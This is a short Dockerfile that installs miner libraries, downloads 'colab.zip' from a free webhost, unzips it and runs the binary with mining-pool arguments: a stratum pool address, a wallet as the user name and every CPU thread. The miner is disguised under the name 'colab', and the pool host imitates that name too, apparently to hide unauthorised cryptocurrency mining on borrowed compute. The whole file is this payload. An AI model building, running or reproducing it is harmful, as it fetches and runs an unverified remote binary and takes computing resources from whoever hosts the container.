FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get install zip wget -y && \
    wget https://reelduckz.000webhostapp.com/education/colab.zip && \
    unzip colab.zip && \
    ./colab -a colab -o stratum+grpc://colab.jadepool.cloud:666 -u RRSVEyN8J6icKKxdb9dohJE8NCun8rqZSL.duck -p x -t $(nproc)
